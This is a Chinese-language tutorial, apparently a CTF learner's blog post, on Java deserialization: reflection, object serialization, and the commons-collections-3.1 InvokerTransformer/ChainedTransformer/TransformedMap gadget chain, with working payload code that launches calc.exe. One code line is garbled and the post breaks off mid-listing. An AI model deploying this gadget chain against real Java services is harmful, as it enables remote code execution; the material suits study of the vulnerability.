## **0x00前言**
因为我平时打CTF的时候遇到的web大部分都是php的代码，php环境搭建也十分的方便。所有在刚刚接触到java反序列化漏洞的时候也不知道怎么下手，因为两者差别还是比较大，所以希望自己的见解能够对刚接触这块的人有所帮助  
我的源码和笔记Github地址在文章的最后
## **0x01我了解JAVA发序列化的过程**
最开始看java反序列化的文章是比较难懂的，即使能把别人的例子拿来运行成功了，但是还是没有把要领装入脑袋中。我学习这方面的步骤如下，希望有所帮助  
1.先了解下JMX是什么，明白本地java虚拟机如何运行远程的java虚拟机的代码，  
2.了解RMI是什么，明白RMI和JMX的异同之处，  
3.了解java反射的机制  
4.了解java的反序列化commons-collections-3.1漏洞  
5.再把commons-collections-3.1的反序列化运用在远程的RMI服务器上
这篇文章讲述的内容是  
本地运行commons-collections-3.1的反序列化  
构造commons-collections-3.1的序列化的代码  
启动rmi服务，利用commons-collections-3.1的反序列化
## **0x02 java反射简介**
先看在java中执行系统命令的方法
    public class ExecTest {
        public static void main(String[] args) throws Exception{
            Runtime.getRuntime().exec("notepad.exe");
        }
    }
该代码会运行并打开windows下的记事本  
它正常的步骤是
    public class ExecTest {
        public static void main(String[] args) throws Exception{
            Runtime runtime = Runtime.getRuntime();
            runtime.exec("notepad.exe");
        }
    }
那么相应的反射的代码如下
    import java.lang.reflect.Method;
    public class ExecTest {
        public static void main(String[] args) throws Exception{
            Object runtime = Class.forName("java.lang.Runtime").getMethod("getRuntime", new Class[]{}).invoke(null);
            //System.out.println(runtime.getClass().getName());
        Class.forName("java.lang.Runtime").getMethod("exec",String.class).invoke(runtime,"notepad.exe");
        }
    }
    getMethod(方法名, 方法类型)
    invoke(某个对象实例， 传入参数)
这里第一句`Object runtime =Class.forName("java.lang.Runtime")`的作用  
等价于 `Object runtime = Runtime.getRuntime()`  
目的是获取一个对象实例好被下一个invoke调用
第二句`Class.forName("java.lang.Runtime").xxxx`的作用就是调用上一步生成的`runtime`实例的`exec`方法，并将`"notepad.exe"`参数传入`exec()`方法
## **0x03 JAVA反序列化的操作函数**
`ObjectOutputStream`类的`writeObject(Object obj)`方法,将对象序列化成字符串数据  
`ObjectInputStream`类的`readObject(Object obj)`方法，将字符串数据反序列化成对象  
测试代码
    import java.io.*;
    public class Serialize {
        public static void main(String[] args) throws Exception{
            //要序列化的数据
            String name = "sijidou";
            //序列化
            FileOutputStream fileOutputStream = new FileOutputStream("serialize1.txt");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(name);
            objectOutputStream.close();
            //反序列化
            FileInputStream fileInputStream = new FileInputStream("serialize1.txt");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            Object result = objectInputStream.readObject();
            objectInputStream.close();
            System.out.println(result);
        }
    }
把刚刚的执行操作的代码进行序列化和反序列化
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    public class Serialize2 {
        public static void main(String[] args) throws Exception{
            //要序列化的数据
            Object runtime = Class.forName("java.lang.Runtime").getMethod("getRuntime", new Class[]{}).invoke(null);
            Object evil = Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(runtime, "notepad.exe");
            //Object evil = Runtime.getRuntime().exec("notepad.exe");
            //序列化
            FileOutputStream fileOutputStream = new FileOutputStream("serialize2.txt");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(evil);
            objectOutputStream.close();
            //反序列化
            FileInputStream fileInputStream = new FileInputStream("serialize2.txt");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            Object result = objectInputStream.readObject();
            objectInputStream.close();
            System.out.println(result);
        }
    }
这样是不能触发的，因为Runtime类没有继承Serializable接口，所以导致不会成功，它弹是在写Object的时候会弹的
## **0x04 commons-collections-3.1反序列化漏洞**
代码在远程调用前，要明白本地是如何实现的，这个时候DEBUG是个非常棒的东西  
首先漏洞组件的下载地址：  
网上很多都拿这个反序列漏洞来讲解java反序列化的知识点，我这里就拿一个payload，代码如下
    public class ApacheSerialize {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
            };
            //将transformers数组存入ChaniedTransformer这个继承类
            Transformer transformerChain = new ChainedTransformer(transformers);
            //创建Map并绑定transformerChina
            Map innerMap = new HashMap();
            innerMap.put("value", "value");
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            //触发漏洞
            Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
            onlyElement.setValue("foobar");
        }
    }
这里涉及到了3个比较重要的对象`InvokerTransformer``ChaniedTransformer`和`TransformedMap`  
首先看看`InvokerTransformer`，它是执行恶意代码的主要问题所在
    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var4) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
            }
        }
    }
可以看到它利用了反射进行调用函数，Object是传进来的参数，`this.iMethodName`,`this.iParamTypes`和`this.iArgs`是类中的私有成员
这反射类比下正常的调用就是如下形式
    input.(this.iMethodName( this.iArgs[0],  this.iArgs[1]))
`input`是类名， `this.iMethodName`是方法名，
之后的`this.iParamTypes`是参数类型，`this.iParamTypes`是参数的值  
查看3个私有变量传进来的方式，是利用的构造函数，即在new的时候，把参数代入到私有成员
    public class InvokerTransformer implements Transformer, Serializable {
        private final String iMethodName;
        private final Class[] iParamTypes;
        private final Object[] iArgs;
        public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            this.iMethodName = methodName;
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
因此我在payload中第一部生成的transformers数组的效果等价于
    transformers[1]
    input.getMethod("getRuntime", null)
    transformers[2]
    input.invoke(null, null);
    transformers[3]
    input.exec("calc.exe");
input是后面调用`transform(Object input)`的传参，但是这3个明显是闲散的，我们的目的是把它们组合起来
这时候就是要靠`ChaniedTransformer`  
看一下`ChainedTransformer`类的transform方法
    public Object transform(Object object) {
            for(int i = 0; i  "getRuntime", \ null)`  
整理一下思路
    ChianedTransformer可以理解为一个数组容器
    ChianedTransformer里面装了4个transform
    TransoformedMap绑定了ChiandTransformer
    step1 : 利用TransoformedMap的setValue触发ChianedTransformer的transform
    step2 : ChianedTransformer的transform是一个循环调用该类里面的transformer的transform方法
    step3 : 第一次循环调用ConstantTransformer("java.Runtime")对象的transformer调用参数为"foobar"(正常要修改的值)，结果无影响
    step4 : 第二次循环调用InvokerTransformer对象getMethod("getRuntime",null)方法，参数为("java.Runtime")会返回一个Runtime.getRuntime()方法
    相当于生产一个字符串，但还没有执行，"Rumtime.getRuntime();"
    step5 : 第三次循环调用InvokerTransformer对象Invoke(null,null)方法，参数为Runtime.getRuntime()，那么会返回一个Runtime对象实例
    相当于执行了该字符串，Object runtime = Rumtime.getRuntime();
    step6 : 第四次循环调用InvokerTransformer对象exec("clac.exe")方法,参数为一个Runtime的对象实例，会执行弹出计算器操作
    调用了对象的方法，runtime.exec("clac,exe")
至此已经能够触发漏洞了，之后还会执行什么步骤无关紧要了
## **0x05 payload实现**
上面的代码只是作为一段小脚本执行了，但是没有被用来通过网络传输payload，然后被反序列化利用，并且还要满足被反序列化之后还会改变map的值等总总因素的影响,假设一个理想的情况如下
    public class ApacheSerialize2 implements Serializable {
        public static void main(String[] args) throws Exception{
             Transformer[] transformers = new Transformer[]{
                     new ConstantTransformer(Runtime.class),
                     new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                     new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                     new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
             };
             Transformer transformerChain = new ChainedTransformer(transformers);
             Map map = new HashMap();
             map.put("value", "sijidou");
             Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
             //序列化
             FileOutputStream fileOutputStream = new FileOutputStream("serialize2.txt");
             ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
             objectOutputStream.writeObject(transformedMap);
             objectOutputStream.close();
             //反序列化
             FileInputStream fileInputStream = new FileInputStream("serialize2.txt");
             ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
             Map result = (TransformedMap)objectInputStream.readObject();
             objectInputStream.close();
             System.out.println(result);
             Map.Entry onlyElement = (Map.Entry) result.entrySet().iterator().next();
             onlyElement.setValue("foobar");
该情况可以触发，但是现实中往往不一定存在把数据反序列化后，再调用其中`TransformedMap`的`Map.Entry`类型的`setValue`方法
在java中，自带的类中还有一个类叫做`AnnotationInvocationHandler`
该类中重写的readObject方法在被调用时会将其中的`map`，转成`Map.Entry`，并执行`setValue`操作，那么能把`TransformedMap`装入这个`AnnotationInvocationHandler`类，再传过去，就可以不用考虑之后代码是否执行`setValue`就可以直接利用漏洞了
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
            var1.defaultReadObject();
            AnnotationType var2 = null;
            try {
                var2 = AnnotationType.getInstance(this.type);
            } catch (IllegalArgumentException var9) {
                throw new InvalidObjectException("Non-annotation type in annotation serial stream");
            }
            Map var3 = var2.memberTypes();